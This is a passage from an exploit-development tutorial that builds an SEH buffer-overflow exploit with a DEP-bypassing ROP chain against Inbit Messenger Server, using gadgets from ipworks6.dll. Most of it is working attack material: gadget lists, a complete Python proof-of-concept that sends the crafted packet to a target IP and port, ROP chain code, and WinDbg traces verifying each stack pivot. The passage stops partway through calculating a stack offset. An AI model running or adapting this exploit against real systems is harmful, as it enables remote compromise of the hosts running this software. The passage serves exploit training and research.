And with some filtering for geed gadgets, we get the following list:

```assembly
# MEMORY READ/WRITE: 

0x26380b58: mov eax, dword [esi] ; pop esi ; retn 0x0004
0x2635262e: mov eax, dword [eax] ; pop esi ; retn 0x0004
0x2638986f: mov dword [ecx], eax ; pop esi ; ret
0x2635805a: mov dword [esi], edi ; pop edi ; pop esi ; ret  
0x263adf17: mov dword [esi], eax ; pop eax ; pop esi ; ret  
0x26341e07: mov dword [edx], ecx ; retn 0x0008 
0x263acad2: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  
0x263ac35b: mov dword [eax], ecx ; xor eax, eax ; pop ebp ; ret  

# REGISTER SET: 

0x2637abeb: pop eax ; ret  
0x2636f279: pop ebp ; ret  
0x263779d4: pop ebx ; ret  
0x26381110: pop ecx ; ret  
0x263b00e1: pop edi ; ret  
0x26362ff0: pop edx ; retn 0x0000 
0x26343300: pop esi ; ret  

# REGISTER MATH: 

0x2639fa5d: add eax, ebp ; ret  
0x263ac3f6: add eax, ecx ; ret  
0x26391202: add ebx, ebp ; ret  
0x263ade70: add ecx, edx ; add eax, ecx ; pop esi ; ret  
0x263ad2be: add edx, ebx ; pop ebx ; retn 0x0010 
0x263acc1e: sub eax, ecx ; ret  
0x2635f778: sub ecx, eax ; mov eax, ecx ; ret  
0x2634fa36: sub edx, ebp ; add eax, 0xC0335900 ; pop esi ; retn 0x0004 
0x2636f377: inc eax ; ret  
0x2638f2f6: inc ebp ; ret  
0x2638faa0: inc ecx ; ret  
0x26349c4d: dec eax ; ret  

# REGISTER MOVE: 

0x263412fb: mov eax, ebx ; pop ebp ; pop ebx ; ret  
0x2635d2b4: mov eax, ecx ; ret  
0x263ac274: mov eax, edi ; pop edi ; ret  
0x263b0962: mov eax, edx ; ret  
0x26356073: mov eax, esi ; pop esi ; ret  
0x2634c723: push eax ; pop edi ; pop esi ; ret  
0x2634c744: push eax ; pop esi ; retn 0x0004 
0x26356056: push ebx ; mov eax, ecx ; pop esi ; ret  

# GET ESP: 

0x2636a0d1: push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
0x2635afa1: mov eax, esp ; adc eax, 0xC0330000 ; retn 0x0010 

# STACK PIVOT - SEH:

0x2636e91e: mov eax, dword [ebp+0x0C] ; push ecx ; mov ecx, edi ; call dword [eax+0x2C] 

# STACK PIVOT - GENERAL:

0x263494c2: xchg esp, edx ; or eax, 0x3B590000 ; ret  
0x263a5ded: xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
```

Although there are other gadgets you can find, these will be enough to complete our DEP bypass. 

## SEH Stack Pivot

Interestingly, finding an SEH pivot gadget proved to be very challenging with `ipworks6.dll`. There were very little general stack pivot gadgets that used static values to add to the stack pointer that matched what we needed:

```assembly
add esp, 0x...
```

This means, we could not rely on just moving the stack with a simple gadget. When searching for SEH specific stack pivots, we had to filter all results knowing where on the stack our SEH handler pointers were:

```
ESP + 0x08
ESP + 0x14
ESP + 0x1C
ESP + 0x2C

EBP + 0x0C
EBP + 0x1C
EBP + 0x30
```

Using this knowledge, we can find the following interesting gadget:

```assembly
0x2636e91e: mov eax, dword [ebp+0x0C] ; push ecx ; mov ecx, edi ; call dword [eax+0x2C] 
```

Although complex at first glance, we can work with it. The first instruction puts into `EAX` the **address** of our SEH handler on the stack. Then we push `ECX`, which we do not care about. Then modify `ECX`, which also does not matter. Then we redirect execution to a gadget address that is at our SEH handler plus `0x2C`. We control the memory where this execution is redirected to. We can store an address of **another gadget** `0x2C` bytes past our SEH handler in our overflow payload format. The reason this is important is that we have used this first gadget to put into `EAX` a reference to our SEH handler. Now we can use the following gadget:

```assembly
0x263a5ded: xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
```

This will move into `ESP` the address of our SEH handler we just put into in `EAX` and then moves the stack up 12 bytes before returning to the next gadget. Combining these 2 gadgets, we have effectively pivoted the stack from the OS exception handler's stack to our payload on the stack that we control. This will allow for us to make our general ROP chain. Before we continue, add these to the PoC:

```python
import sys, socket, struct, argparse, logging

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"L0Lz"                       # NOTE: not used
SEH  = struct.pack("<I", 0x2636e91e) # ipworks6.dll | mov eax, dword [ebp+0x0C] ; push ecx ; mov ecx, edi ; call dword [eax+0x2C] 

PLACEHOLDERS = [
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# KERNEL32!VirtualAllocStub
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  0x41414141, # virtual address of KERNEL32!VirtualAllocStub from IAT
  0x42424242, # address of shellcode (same as lpAddress)
  0x69696969, # arg1: lpAddress 
  0x00000200, # arg2: dwSize (512 bytes)
  0x00001000, # arg3: flAllocationType (MEM_COMMIT = 0x00001000)
  0x00000040, # arg4: flProtect (PAGE_EXECUTE_READWRITE = 0x00000040)
]

ROP = [
  0x69696969, # END OF CHAIN
]

def exploit(targetIp:str, targetPort:int) -> None:
  pkt  = b""
  pkt += b"".join([struct.pack("<I", _) for _ in PLACEHOLDERS])
  pkt += (b"A" * (40 - len(pkt)))
  pkt += nSEH 
  pkt += SEH
  # NOTE: filler up to the second SEH pivot gadget (minus 8 for SEH handler)
  pkt += (b"C" * (0x2C - 8))
  # NOTE: second SEH stack pivot gadget to point stack to nSEH
  pkt += struct.pack("<I", 0x263a5ded) # ipworks6.dll | xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  pkt += b"".join([struct.pack("<I", _) for _ in ROP])
  # NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
  pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))
  # NOTE: check for bad bytes
  for c in pkt:
    if c in BAD_BYTES:
      logging.error(f"found bad byte 0x{c:02x} in payload")
      sys.exit(-1)
  logging.info(f"sending {len(pkt)} byte payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(b"<" + pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
  parser.add_argument('-t', '--target', help='target IP',   type=str, required=True)
  parser.add_argument('-p', '--port',   help='target port', type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # run exploit
  exploit(args.target, args.port)
```

Send this new PoC and then break on the first SEH pivot gadget:

```
(1be0.155c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=02784f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp 0x2636e91e
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=2636e91e edx=77a45e30 esi=00000000 edi=00000000
eip=2636e91e esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!XMPP_Do+0xe64:
2636e91e 8b450c          mov     eax,dword ptr [ebp+0Ch] ss:0023:0014f2ec=0014fa04
0:000> dps ebp L0n10
0014f2e0  0014f3a8
0014f2e4  77a45de4 ntdll!ExecuteHandler+0x24
0014f2e8  0014f3c0
0014f2ec  0014fa04
0014f2f0  0014f3dc
0014f2f4  0014f34c
0014f2f8  2636e91e ipworks6!XMPP_Do+0xe64
0014f2fc  0014fa04
0014f300  0014f3c0
0014f304  00000000
```

Here we see that we are about to move in `EAX` a reference to our SEH handler on the stack. Now single step and make sure we get to the second gadget:

```
0:000> r
eax=00000000 ebx=00000000 ecx=2636e91e edx=77a45e30 esi=00000000 edi=00000000
eip=2636e91e esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!XMPP_Do+0xe64:
2636e91e 8b450c          mov     eax,dword ptr [ebp+0Ch] ss:0023:0014f2ec=0014fa04
0:000> t
eax=0014fa04 ebx=00000000 ecx=2636e91e edx=77a45e30 esi=00000000 edi=00000000
eip=2636e921 esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!XMPP_Do+0xe67:
2636e921 51              push    ecx
0:000> t
eax=0014fa04 ebx=00000000 ecx=2636e91e edx=77a45e30 esi=00000000 edi=00000000
eip=2636e922 esp=0014f2bc ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!XMPP_Do+0xe68:
2636e922 8bcf            mov     ecx,edi
0:000> t
eax=0014fa04 ebx=00000000 ecx=00000000 edx=77a45e30 esi=00000000 edi=00000000
eip=2636e924 esp=0014f2bc ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!XMPP_Do+0xe6a:
2636e924 ff502c          call    dword ptr [eax+2Ch]  ds:0023:0014fa30=263a5ded
```

Now we are about to call the next gadget with `EAX` holding a reference to our SEH handler. Single step and make sure the stack is pivoted as expected to `nSEH`:

```
0:000> r
eax=0014fa04 ebx=00000000 ecx=00000000 edx=77a45e30 esi=00000000 edi=00000000
eip=2636e924 esp=0014f2bc ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!XMPP_Do+0xe6a:
2636e924 ff502c          call    dword ptr [eax+2Ch]  ds:0023:0014fa30=263a5ded
0:000> t
eax=0014fa04 ebx=00000000 ecx=00000000 edx=77a45e30 esi=00000000 edi=00000000
eip=263a5ded esp=0014f2b8 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x31482:
263a5ded 94              xchg    eax,esp
0:000> t
eax=0014f2b8 ebx=00000000 ecx=00000000 edx=77a45e30 esi=00000000 edi=00000000
eip=263a5dee esp=0014fa04 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x31483:
263a5dee 33c0            xor     eax,eax
0:000> t
eax=00000000 ebx=00000000 ecx=00000000 edx=77a45e30 esi=00000000 edi=00000000
eip=263a5df0 esp=0014fa04 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x31485:
263a5df0 5f              pop     edi
0:000> t
eax=00000000 ebx=00000000 ecx=00000000 edx=77a45e30 esi=00000000 edi=7a4c304c
eip=263a5df1 esp=0014fa08 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x31486:
263a5df1 5e              pop     esi
0:000> t
eax=00000000 ebx=00000000 ecx=00000000 edx=77a45e30 esi=2636e91e edi=7a4c304c
eip=263a5df2 esp=0014fa0c ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x31487:
263a5df2 5b              pop     ebx
0:000> t
eax=00000000 ebx=43434343 ecx=00000000 edx=77a45e30 esi=2636e91e edi=7a4c304c
eip=263a5df3 esp=0014fa10 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x31488:
263a5df3 c3              ret
0:000> t
eax=00000000 ebx=43434343 ecx=00000000 edx=77a45e30 esi=2636e91e edi=7a4c304c
eip=43434343 esp=0014fa14 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
43434343 ??              ???
```

Nice! We have pivoted the stack into our stack buffer payload! Next we need to do one small last pivot. Here we are in the buffer of `C` values we added to our payload before the gadget at `0x263a5ded`. We could start our ROP chain here, but that would mean we will eventually run into the gadget `0x263a5ded` as our ROP chain grows. A better solution would be to use a small stack pivot gadget and then move the stack past our `0x263a5ded` gadget that was `0x2C` bytes past our SEH handler. The following will work fine:

```assembly
0x263ac8ec: add esp, 0x20 ; pop ebp ; ret
```

This will move the stack past the `0x263a5ded` gadget and into our conflict-free payload on the stack. Add this to the PoC and make sure we get to the ROP chain:

```python
import sys, socket, struct, argparse, logging

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"L0Lz"                       # NOTE: not used
SEH  = struct.pack("<I", 0x2636e91e) # ipworks6.dll | mov eax, dword [ebp+0x0C] ; push ecx ; mov ecx, edi ; call dword [eax+0x2C] 

PLACEHOLDERS = [
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# KERNEL32!VirtualAllocStub
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  0x41414141, # virtual address of KERNEL32!VirtualAllocStub from IAT
  0x42424242, # address of shellcode (same as lpAddress)
  0x69696969, # arg1: lpAddress 
  0x00000200, # arg2: dwSize (512 bytes)
  0x00001000, # arg3: flAllocationType (MEM_COMMIT = 0x00001000)
  0x00000040, # arg4: flProtect (PAGE_EXECUTE_READWRITE = 0x00000040)
]

ROP = [
  # NOTE: filler to see where our final SEH stack pivot takes us
  0x11111111, 
  0x22222222, 
  0x33333333,  
  0x44444444,  
  0x55555555,  
  0x69696969, # END OF CHAIN
]

def exploit(targetIp:str, targetPort:int) -> None:
  pkt  = b""
  pkt += b"".join([struct.pack("<I", _) for _ in PLACEHOLDERS])
  pkt += (b"A" * (40 - len(pkt)))
  # NOTE: SEH stack pivot starts here for gadget @ 0x263a5ded
  pkt += nSEH    # pop edi
  pkt += SEH     # pop esi
  pkt += b'L0Lz' # pop ebx
  # NOTE: pivot stack just past the gadget @ 0x263a5ded
  pkt += struct.pack("<I", 0x263ac8ec) # ipworks6.dll | add esp, 0x20 ; pop ebp ; ret
  # NOTE: filler up to the second SEH pivot gadget (minus 16 for 3x POP and 0x263ac8ec gadget)
  pkt += (b"C" * (0x2C - 16))
  # NOTE: second SEH stack pivot gadget to point stack to nSEH
  pkt += struct.pack("<I", 0x263a5ded) # ipworks6.dll | xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  # NOTE: gadget @ 0x263ac8ec pivots the stack here to begin execution
  pkt += b"".join([struct.pack("<I", _) for _ in ROP])
  # NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
  pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))
  # NOTE: check for bad bytes
  for c in pkt:
    if c in BAD_BYTES:
      logging.error(f"found bad byte 0x{c:02x} in payload")
      sys.exit(-1)
  logging.info(f"sending {len(pkt)} byte payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(b"<" + pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
  parser.add_argument('-t', '--target', help='target IP',   type=str, required=True)
  parser.add_argument('-p', '--port',   help='target port', type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # run exploit
  exploit(args.target, args.port)
```

Now send the PoC and break at all 3 gadgets we use to pivot the SEH exception stack:

```
(3c4.e28): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=027f4f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp 0x2636e91e
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=2636e91e edx=77a45e30 esi=00000000 edi=00000000
eip=2636e91e esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!XMPP_Do+0xe64:
2636e91e 8b450c          mov     eax,dword ptr [ebp+0Ch] ss:0023:0014f2ec=0014fa04
0:000> bp 0x263a5ded
0:000> g
Breakpoint 1 hit
eax=0014fa04 ebx=00000000 ecx=00000000 edx=77a45e30 esi=00000000 edi=00000000
eip=263a5ded esp=0014f2b8 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x31482:
263a5ded 94              xchg    eax,esp
0:000> bp 0x263ac8ec
0:000> g
Breakpoint 2 hit
eax=00000000 ebx=7a4c304c ecx=00000000 edx=77a45e30 esi=2636e91e edi=7a4c304c
eip=263ac8ec esp=0014fa14 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0x37f81:
263ac8ec 83c420          add     esp,20h
```

All clear. Now single step into our ROP chain on the stack:

```
0:000> t
eax=00000000 ebx=7a4c304c ecx=00000000 edx=77a45e30 esi=2636e91e edi=7a4c304c
eip=263ac8ef esp=0014fa34 ebp=0014f2e0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ipworks6!NetCode_StaticDestroy+0x37f84:
263ac8ef 5d              pop     ebp
0:000> dps esp L0n10
0014fa34  11111111
0014fa38  22222222
0014fa3c  33333333
0014fa40  44444444
0014fa44  55555555
0014fa48  69696969
0014fa4c  42424242
0014fa50  42424242
0014fa54  42424242
0014fa58  42424242
0:000> t
eax=00000000 ebx=7a4c304c ecx=00000000 edx=77a45e30 esi=2636e91e edi=7a4c304c
eip=263ac8f0 esp=0014fa38 ebp=11111111 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ipworks6!NetCode_StaticDestroy+0x37f85:
263ac8f0 c3              ret
```

Nice! We moved the stack right to the beginning of our ROP chain on the stack! The only thing we need to accommodate for is that the first value in our ROP chain will be put into `EBP` before our first ROP chain gadget is executed. 

## Writing VirtualAlloc Placeholder

The first task our proper ROP chain needs to do is get the virtual address of `VirtualAlloc` using the IAT address we found previously `0x263b4150` and write it to the placeholder. To do this, we will use the following gadgets:

```assembly
0x2637abeb: pop eax ; ret  
0x2635262e: mov eax, dword [eax] ; pop esi ; retn 0x0004
0x2634c723: push eax ; pop edi ; pop esi ; ret  
```

Here we will put into `EAX` the IAT address and then dereference it to get the virtual address back into `EAX`. Then we move that value into `EDI` because `EAX` is a highly contested register in ROP gadgets. Now we need to get a stack pointer reference and then calculate a relative offset to where our placeholder will be:

```assembly
0x2636a0d1: push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
0x26356073: mov eax, esi ; pop esi ; ret  
0x26381110: pop ecx ; ret  
0x263ac3f6: add eax, ecx ; ret  
0x2634c744: push eax ; pop esi ; retn 0x0004 
0x2635805a: mov dword [esi], edi ; pop edi ; pop esi ; ret  
```

There are quite a few gadgets here, but they get the job done. We get into `ESI` the current stack pointer. Then we put that value into `EAX` and the put a static value in `ECX`. This static value will be a negative offset that we will add to the stack pointer reference to get into `ESI` a stack pointer to our placeholders on the stack. Lastly, we then write the saved `VirtualAlloc` value in `EDI` to our calculated stack address value.

There is a quick problem with this method. The gadget at `0x2636a0d1` will try to write to memory at `EAX`. We can get around this by locating a data cave in `ipworks6.dll` that we can use as a writeable address to put into `EAX`. This works because Windows allocates memory sections for an executable to always be **page-aligned**. This means that even if the application does not need an exact multiple of the system page size of memory for a section, the OS will allocate enough memory to pad out the section to be page-aligned. Usually, the system page size is 4KiB. The space left over that the module does not use in a given section is called a "cave" and can be used by us for writable memory! Using WinDbg, identify a data cave in `ipworks6.dll`:

```
0:000> !dh ipworks6

File Type: DLL
FILE HEADER VALUES
     14C machine (i386)
       5 number of sections
41D5D500 time date stamp Fri Dec 31 14:38:56 2004

       0 file pointer to symbol table
       0 number of symbols
      E0 size of optional header
    210E characteristics
            Executable
            Line numbers stripped
            Symbols stripped
            32 bit word machine
            DLL

OPTIONAL HEADER VALUES
     10B magic #
    6.00 linker version
   73000 size of code
   1E000 size of initialized data
       0 size of uninitialized data
   6D578 address of entry point
    1000 base of code
         ----- new -----
26340000 image base
    1000 section alignment
    1000 file alignment
       2 subsystem (Windows GUI)
    4.00 operating system version
    0.00 image version
    4.00 subsystem version
   92000 size of image
    1000 size of headers
   A1520 checksum
00100000 size of stack reserve
00001000 size of stack commit
00100000 size of heap reserve
00001000 size of heap commit
       0  DLL characteristics
   79FF0 [    2A91] address [size] of Export Directory
   79568 [      64] address [size] of Import Directory
   89000 [    1ED0] address [size] of Resource Directory
       0 [       0] address [size] of Exception Directory
   92000 [     D08] address [size] of Security Directory
   8B000 [    5BD4] address [size] of Base Relocation Directory
       0 [       0] address [size] of Debug Directory
       0 [       0] address [size] of Description Directory
       0 [       0] address [size] of Special Directory
       0 [       0] address [size] of Thread Storage Directory
       0 [       0] address [size] of Load Configuration Directory
       0 [       0] address [size] of Bound Import Directory
   74000 [     1EC] address [size] of Import Address Table Directory
       0 [       0] address [size] of Delay Import Directory
       0 [       0] address [size] of COR20 Header Directory
       0 [       0] address [size] of Reserved Directory


SECTION HEADER #1
   .text name
   72706 virtual size
    1000 virtual address
   73000 size of raw data
    1000 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
60000020 flags
         Code
         (no align specified)
         Execute Read

SECTION HEADER #2
  .rdata name
    8A81 virtual size
   74000 virtual address
    9000 size of raw data
   74000 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
40000040 flags
         Initialized Data
         (no align specified)
         Read Only

SECTION HEADER #3
   .data name
    BA5C virtual size
   7D000 virtual address
    C000 size of raw data
   7D000 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
C0000040 flags
         Initialized Data
         (no align specified)
         Read Write

SECTION HEADER #4
   .rsrc name
    1ED0 virtual size
   89000 virtual address
    2000 size of raw data
   89000 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
40000040 flags
         Initialized Data
         (no align specified)
         Read Only

SECTION HEADER #5
  .reloc name
    6080 virtual size
   8B000 virtual address
    7000 size of raw data
   8B000 file pointer to raw data
       0 file pointer to relocation table
       0 file pointer to line numbers
       0 number of relocations
       0 number of line numbers
42000040 flags
         Initialized Data
         Discardable
         (no align specified)
         Read Only
```

The `.data` section is usually marked as readable and writable. It is at virtual address `0x7D000` relative to the base of the module and has a size `0xBA5C`. Inspect that memory:

```
0:000> !address ipworks6+0x7D000+0xBA5C

Usage:                  Image
Base Address:           263c7000
End Address:            263c9000
Region Size:            00002000 (   8.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   01000000          MEM_IMAGE
Allocation Base:        26340000
Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
Image Path:             C:\Program Files\Inbit\Inbit Messenger Server\ipworks6.dll
Module Name:            ipworks6
Loaded Image Name:      C:\Program Files\Inbit\Inbit Messenger Server\ipworks6.dll
Mapped Image Name:      
More info:              lmv m ipworks6
More info:              !lmi ipworks6
More info:              ln 0x263c8a5c
More info:              !dh 0x26340000


Content source: 1 (target), length: 5a4
```

Notice that the address is at `0x263c8a5c` but the memory region ends at `0x263c9000`. Find the difference:

```
0:000> ? 0x263c9000-0x263c8a5c
Evaluate expression: 1444 = 000005a4
```

Nice! We have 1444 bytes of data cave space that is writable. We will use the address `0x263c8b00` as our writable location. With these pieces, the only missing value is the exact value to use for the relative stack offset. For now, we will use a random value and then calculate what it needs to be dynamically. Combine what we have into the PoC:

**NOTE** Only showing the ROP chain part since the rest of the PoC is not changing...

```python
ROP = [
  # NOTE: EDI = virtual address of KERNEL32!VirtualAllocStub
  0x2637abeb, # pop eax ; ret  
  0x263b4150, # // IAT for KERNEL32!VirtualAllocStub
  0x2635262e, # mov eax, dword [eax] ; pop esi ; retn 0x0004
  0x69696969, # // esi = junk
  0x2634c723, # push eax ; pop edi ; pop esi ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2635262e
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of KERNEL32!VirtualAllocStub placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffffff, # // ecx = UNKNOWN OFFSET
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: write KERNEL32!VirtualAllocStub placeholder
  0x2635805a, # mov dword [esi], edi ; pop edi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744
  0x69696969, # // edi = junk
  0x69696969, # // esi = junk
  # NOTE: END OF CHAIN
  0x69696969, 
]
```

Run the above PoC and single step in WinDbg to see what offset value we need to put into `ECX` instead of `0xffffffff`:

```
(500.1c20): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=02724f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp 0x26381110
0:000> g
Breakpoint 0 hit
eax=0014fa60 ebx=7a4c304c ecx=00000000 edx=77a45e30 esi=69696969 edi=766f4da0
eip=26381110 esp=0014fa70 ebp=7a4c304c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0xc7a5:
26381110 59              pop     ecx
```

Here we are at the `POP ECX` gadget. Find the placeholders on the stack by searching for the current placeholder values:

```
0:000> !teb
TEB at 003b4000
    ExceptionList:        0014f2d4
    StackBase:            00150000
    StackLimit:           0014b000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 003b4000
    EnvironmentPointer:   00000000
    ClientId:             00000500 . 00001c20
    RpcHandle:            00000000
    Tls Storage:          0086ebb8
    PEB Address:          003b3000
    LastErrorValue:       0
    LastStatusValue:      c0000034
    Count Owned Locks:    0
    HardErrorMode:        0
0:000> s -a 0014b000 00150000 AAAABBBBiiii
0014f9dc  41 41 41 41 42 42 42 42-69 69 69 69 00 02 00 00  AAAABBBBiiii....
0:000> dps 0014f9dc L0n6
